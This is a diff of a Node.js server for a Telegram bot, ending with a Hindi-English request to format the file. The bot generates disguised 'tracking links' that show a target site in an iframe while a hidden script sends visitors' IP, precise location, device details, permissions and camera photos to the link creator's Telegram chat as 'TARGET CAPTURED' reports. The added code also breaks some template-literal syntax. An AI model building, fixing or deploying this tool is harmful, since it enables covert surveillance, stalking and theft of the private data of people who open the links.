@@ -17,281 +17,242 @@ const DB_FILE = "./database.json";
 
 // ===== DB =====
 function loadDB() {
-  if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, "{}");
-  return JSON.parse(fs.readFileSync(DB_FILE));
+if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, "{}");
+return JSON.parse(fs.readFileSync(DB_FILE));
 }
 
 function saveDB(data) {
-  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
+fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 }
 
 function generateId() {
-  return Math.random().toString(36).substring(2, 8);
+return Math.random().toString(36).substring(2, 8);
 }
 
 // ===== HOME =====
 app.get("/", (req, res) => {
-  res.send("Server Running 🚀");
+res.send("Server Running 🚀");
 });
 
 // ===== TRACK PAGE =====
 app.get("/pro/:id", (req, res) => {
-  const trackingId = req.params.id;
-  const db = loadDB();
-  const entry = db[trackingId];
+const trackingId = req.params.id;
+const db = loadDB();
+const entry = db[trackingId];
 
-  if (!entry) return res.send("Invalid Link");
+if (!entry) return res.send("Invalid Link");
 
-  res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-html,body{margin:0;height:100%;overflow:hidden}
-iframe{width:100%;height:100%;border:none}
-</style>
-</head>
-<body>
+res.send(`
 
-<iframe src="${entry.targetUrl}"></iframe>
-
-<script
-data-tracking-id="${trackingId}"
-data-server-url="https://zs-trace.onrender.com"
-src="/script.js"></script>
-
-</body>
-</html>
-`);
-});
-
-// ===== DATA =====
+<!DOCTYPE html>  <html>  
+<head>  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<style>  
+html,body{margin:0;height:100%;overflow:hidden}  
+iframe{width:100%;height:100%;border:none}  
+</style>  
+</head>  
+<body>  <iframe src="${entry.targetUrl}"></iframe>  <script  
+data-tracking-id="${trackingId}"  
+data-server-url="https://zs-trace.onrender.com"  
+src="/script.js"></script>  </body>  
+</html>  
+`);  
+});  // ===== DATA =====
 app.post("/data", async (req, res) => {
-  const trackingId = req.query.trackingId;
-  const data = req.body;
+const trackingId = req.query.trackingId;
+const data = req.body;
 
-  const db = loadDB();
-  const entry = db[trackingId];
-  if (!entry) return res.sendStatus(404);
+const db = loadDB();
+const entry = db[trackingId];
+if (!entry) return res.sendStatus(404);
 
-  const chatId = entry.owner;
-  const targetUrl = entry.targetUrl;
+const chatId = entry.owner;
+const targetUrl = entry.targetUrl;
 
-  if (!data.IP_Address && !data.Device_Model) {
-    return res.sendStatus(200);
-  }
+// ignore empty / duplicate calls
+if (!data.IP_Address && !data.Device_Model) {
+return res.sendStatus(200);
+}
 
-  const val = (v) => v || "N/A";
+try {
+const msg = `
+📊 <b>VISITOR INFORMATION CAPTURED</b>
+━━━━━━━━━━━━━━━━━━
 
-  try {
-    const msg = `
-🖥️ <b>NEW SESSION CAPTURED</b> 🖥️
+🖥️ <b>Device & Browser</b>
+• <b>Device:</b> ${data.Device_Model || "N/A"}
+• <b>User Agent:</b>
+<code>${data.User_Agent || "N/A"}</code>
 
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
-<b>🖥️ CYBER ACCESS LOG 🖥️</b>
-┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
+🌐 <b>Network Information</b>
+• <b>IP Address:</b> ${data.IP_Address || "N/A"}
+• <b>Language:</b> ${data.Language || "N/A"}
 
-🕶 <b>TARGET IDENTITY</b>
-════════════════════
-🌐 IP        ➤ ${val(data.IP_Address)}
-📶 STATUS    ➤ Online
-🗣 LANG      ➤ ${val(data.Language)}
+📍 <b>Location Details</b>
+• <b>Country:</b> ${data.Location?.Country || "N/A"}
+• <b>Region:</b> ${data.Location?.Region || "N/A"}
+• <b>City:</b> ${data.Location?.City || "N/A"}
+• <b>Postal Code:</b> ${data.Location?.Postal_Code || "N/A"}
+• <b>Timezone:</b> ${data.Timezone || "N/A"}
 
-📱 <b>DEVICE SCAN</b>
-════════════════════
-📲 MODEL     ➤ ${val(data.Device_Model)}
-⚙️ PLATFORM  ➤ ${val(data.Platform)}
-🍪 COOKIES   ➤ ${val(data.Cookies_Enabled)}
-🧾 AGENT     ➤ <code>${val(data.User_Agent)}</code>
+🗺 <b>Live Map</b>
+${
+data.Location?.Google_Maps
+? <a href="${data.Location.Google_Maps}">📍 Open Location</a>
+: "❌ Not Available"
+}
 
-🖥 <b>DISPLAY MATRIX</b>
-════════════════════
-📺 SCREEN    ➤ ${val(data.Screen_Resolution)}
-🎨 COLORS    ➤ ${val(data.Color_Depth)}
-🌍 ZONE      ➤ ${val(data.Timezone)}
+🖼️ <b>Display Information</b>
+• <b>Resolution:</b> ${data.Screen_Resolution || "N/A"}
 
-🔋 <b>POWER CORE</b>
-════════════════════
-🔋 BATTERY   ➤ ${val(data.Battery?.Level)}
-⚡ CHARGING  ➤ ${val(data.Battery?.Charging)}
+🔋 <b>Battery Status</b>
+• <b>Level:</b> ${data.Battery?.Level || "N/A"}
+• <b>Charging:</b> ${data.Battery?.Charging || "N/A"}
 
-⚙️ <b>HARDWARE NODE</b>
-════════════════════
-🧠 CPU       ➤ ${val(data.Hardware?.CPU_Cores)} Cores
-💾 RAM       ➤ ${val(data.Hardware?.Device_Memory_GB)} GB
+🔐 <b>Device Permissions</b>
+• <b>Camera:</b> ${data.Permissions?.Camera || "Unknown"}
+• <b>Location:</b> ${data.Permissions?.Location || "Unknown"}
 
-💽 <b>STORAGE TRACE</b>
-════════════════════
-📂 USED      ➤ ${val(data.Storage?.Used)} GB
-📦 TOTAL     ➤ ${val(data.Storage?.Total)} GB
-
-📡 <b>NETWORK SIGNAL</b>
-════════════════════
-📶 TYPE      ➤ ${val(data.Network_Info?.Type)}
-🚀 SPEED     ➤ ${val(data.Network_Info?.Downlink_MBps)} Mb/s
-📡 RTT       ➤ ${val(data.Network_Info?.RTT_ms)}
-💡 SAVE DATA ➤ ${val(data.Network_Info?.Save_Data)}
-
-📍 <b>GEO TRACKER</b>
-════════════════════
-📌 LAT       ➤ ${val(data.Location?.Latitude)}
-📌 LONG      ➤ ${val(data.Location?.Longitude)}
-🎯 ACCURACY  ➤ ${val(data.Location?.Accuracy)}
-🗺 MAP       ➤ ${val(data.Permissions?.Location)}
-
-🌍 <b>GEO DATABASE</b>
-════════════════════
-🌎 COUNTRY   ➤ ${val(data.Location?.Country)}
-🏙 REGION    ➤ ${val(data.Location?.Region)}
-🏠 CITY      ➤ ${val(data.Location?.City)}
-📡 ISP       ➤ ${val(data.Location?.ISP)}
-
-📲 <b>DEVICE TYPE</b>
-════════════════════
-🛠 ${val(data.Device_Type)}
-
-🌐 <b>BROWSER CORE</b>
-════════════════════
-🧠 BROWSER   ➤ ${val(data.Browser)}
-⚙️ ENGINE    ➤ ${val(data.Engine)}
-
-⏳ <b>SESSION TRACE</b>
-════════════════════
-🕒 TIME      ➤ ${val(data.Session?.Time)}
-⌛ DURATION  ➤ ${val(data.Session?.Duration)}
+💾 <b>Hardware & Storage</b>
+• <b>CPU Cores:</b> ${data.Hardware?.CPU_Cores || "N/A"}
+• <b>RAM:</b> ${data.Hardware?.Device_Memory_GB || "N/A"} GB
+• <b>Storage Used:</b> ${data.Storage?.Used || "0.00"} GB
+• <b>Storage Total:</b> ${data.Storage?.Total || "0.00"} GB
 
 ━━━━━━━━━━━━━━━━━━
-🎯 <b>TARGET:</b>
+🎯 <b>Target:</b>
 <code>${targetUrl}</code>
-
-┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
-⚡ <b>POWERED BY ZShadow</b> ⚡
-┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
 `;
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: msg,
-        parse_mode: "HTML"
-      })
-    });
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
+  method: "POST",  
+  headers: {  
+    "Content-Type": "application/json"  
+  },  
+  body: JSON.stringify({  
+    chat_id: chatId,  
+    text: msg,  
+    parse_mode: "HTML"  
+  })  
+});
 
-  } catch (e) {
-    console.log("DATA ERROR:", e);
-  }
+} catch (e) {
+console.log("DATA ERROR:", e);
+}
 
-  res.sendStatus(200);
+res.sendStatus(200);
 });
 
 // ===== PHOTO =====
 app.post("/photo", async (req, res) => {
-  const trackingId = req.query.trackingId;
+const trackingId = req.query.trackingId;
 
-  const db = loadDB();
-  const entry = db[trackingId];
-  if (!entry) return res.sendStatus(404);
+const db = loadDB();
+const entry = db[trackingId];
+if (!entry) return res.sendStatus(404);
 
-  const chatId = entry.owner;
-  const targetUrl = entry.targetUrl;
+const chatId = entry.owner;
+const targetUrl = entry.targetUrl;
 
-  try {
-    const { imageData } = req.body;
-    if (!imageData) return res.sendStatus(400);
+try {
+const { imageData } = req.body;
+if (!imageData) return res.sendStatus(400);
 
-    const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
-    const filePath = path.join(__dirname, `photo_${Date.now()}.jpg`);
-    fs.writeFileSync(filePath, base64Data, "base64");
+const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");  
 
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", fs.createReadStream(filePath));
+const filePath = path.join(__dirname, `photo_${Date.now()}.jpg`);  
+fs.writeFileSync(filePath, base64Data, "base64");  
 
-    formData.append(
-      "caption",
-      `🎯 TARGET CAPTURED 📸\n\n🔗 ${targetUrl}`
-    );
+const formData = new FormData();  
+formData.append("chat_id", chatId);  
+formData.append("photo", fs.createReadStream(filePath));  
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: "POST",
-      body: formData
-    });
+// 🔥 caption with target  
+formData.append(  
+  "caption",  
+  `🎯 TARGET CAPTURED 📸\n\n🔗 ${targetUrl}`  
+);  
 
-    fs.unlinkSync(filePath);
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {  
+  method: "POST",  
+  body: formData  
+});  
 
-  } catch (err) {
-    console.log("PHOTO ERROR:", err);
-  }
+fs.unlinkSync(filePath);
 
-  res.sendStatus(200);
+} catch (err) {
+console.log("PHOTO ERROR:", err);
+}
+
+res.sendStatus(200);
 });
 
 // ===== TELEGRAM =====
-app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
-  const msg = req.body.message;
-  if (!msg) return res.sendStatus(200);
+app.post(/bot${BOT_TOKEN}, async (req, res) => {
+const msg = req.body.message;
+if (!msg) return res.sendStatus(200);
 
-  const chatId = msg.chat.id;
-  const text = msg.text || "";
+const chatId = msg.chat.id;
+const text = msg.text || "";
 
-  const db = loadDB();
+const db = loadDB();
 
-  if (text === "/start") {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: "👋 Welcome!\n\nUse /create to generate tracking link"
-      })
-    });
-  }
+if (text === "/start") {
+await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+chat_id: chatId,
+text: "👋 Welcome!\n\nUse /create to generate tracking link"
+})
+});
+}
 
-  else if (text === "/create") {
-    db[chatId] = { waiting: true };
-    saveDB(db);
+else if (text === "/create") {
+db[chatId] = { waiting: true };
+saveDB(db);
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: "Send target URL"
-      })
-    });
-  }
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
+  method: "POST",  
+  headers: { "Content-Type": "application/json" },  
+  body: JSON.stringify({  
+    chat_id: chatId,  
+    text: "Send target URL"  
+  })  
+});
 
-  else if (db[chatId]?.waiting) {
-    const id = generateId();
+}
 
-    db[id] = {
-      owner: chatId,
-      targetUrl: text
-    };
+else if (db[chatId]?.waiting) {
+const id = generateId();
 
-    db[chatId].waiting = false;
-    saveDB(db);
+db[id] = {  
+  owner: chatId,  
+  targetUrl: text  
+};  
 
-    const link = `https://zs-trace.onrender.com/pro/${id}`;
+db[chatId].waiting = false;  
+saveDB(db);  
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: `✅ Link Created:\n${link}`
-      })
-    });
-  }
+const link = `https://zs-trace.onrender.com/pro/${id}`;  
 
-  res.sendStatus(200);
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
+  method: "POST",  
+  headers: { "Content-Type": "application/json" },  
+  body: JSON.stringify({  
+    chat_id: chatId,  
+    text: `✅ Link Created:\n${link}`  
+  })  
+});
+
+}
+
+res.sendStatus(200);
 });
 
 // ===== START =====
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log("Server Running 🚀"));
+
+ye ke server.js isme format karke dena muje smj nHi aa raha kuchh
